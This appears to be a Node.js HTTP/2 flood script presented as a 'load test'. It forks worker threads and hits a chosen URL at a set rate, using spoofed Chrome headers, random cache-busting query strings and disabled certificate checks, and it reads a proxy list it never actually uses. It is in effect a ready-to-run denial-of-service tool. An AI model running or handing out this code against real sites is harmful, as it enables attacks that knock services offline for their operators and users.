const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
    console.log('Usage: node load_test.js <target> <time> <rate> <threads> <proxyfile>');
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(line => line.trim());
    if (lines.length === 0) {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

const headers = {
    ':method': 'GET',
    ':authority': parsedTarget.host,
    ':path': parsedTarget.path || '/',
    ':scheme': 'https',
    'sec-ch-ua': '"Google Chrome";v="117"',
    'sec-ch-ua-platform': 'Windows',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US',
    'accept': 'text/html,application/json',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
};

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    console.log(`Starting load test on ${parsedTarget.host} for ${args.time}s with ${args.threads} threads, ${args.rate} RPS`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => {
        console.log('Load test completed.');
        process.exit(0);
    }, args.time * 1000);
} else {
    // Điều chỉnh interval để ổn định RPS
    const intervalMs = 1000 / args.rate; // Chia đều request trong 1 giây
    setInterval(runLoadTest, intervalMs);
}

function runLoadTest() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(':');
    if (!proxyHost || !proxyPort) {
        return; // Bỏ qua proxy không hợp lệ, không log
    }

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ['h2'],
        ciphers: 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
        ecdhCurve: 'auto',
        host: parsedTarget.host,
        servername: parsedTarget.host,
        rejectUnauthorized: false
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
        protocol: 'https:',
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 5000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        },
        createConnection: () => tlsConn
    });

    client.on('connect', () => {
        // Gửi đúng 1 request mỗi lần gọi để ổn định RPS
        const request = client.request({
            ...headers,
            ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5)
        });
        request.on('response', () => {
            request.close();
            request.destroy();
        });
        request.on('error', () => {
            request.close();
            request.destroy();
        });
        request.end();

        setTimeout(() => {
            client.destroy();
            tlsConn.destroy();
        }, args.time * 1000);
    });

    client.on('error', () => {
        client.destroy();
        tlsConn.destroy();
    });

    client.on('close', () => {
        client.destroy();
        tlsConn.destroy();
    });
}
